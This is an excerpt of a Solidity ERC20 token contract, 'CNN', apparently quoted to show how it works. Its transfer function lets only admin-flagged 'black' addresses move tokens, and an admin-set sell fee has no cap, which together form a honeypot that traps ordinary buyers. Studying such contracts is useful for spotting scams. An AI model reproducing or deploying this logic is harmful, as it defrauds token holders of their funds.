...
contract CNN is Ownable, ERC20 {
    ...
    function setWhiteList(address addr, bool b) external onlyAdmin {
        whiteList[addr] = b;
    }
    ...
    function setFee(uint sellFee_) external onlyAdmin {
        sellFee = sellFee_;
    }
    ...
    function setBlack(address addr, bool b) external onlyAdmin {
        black[addr] = b;
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(black[msg.sender] || black[recipient], 'black');
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
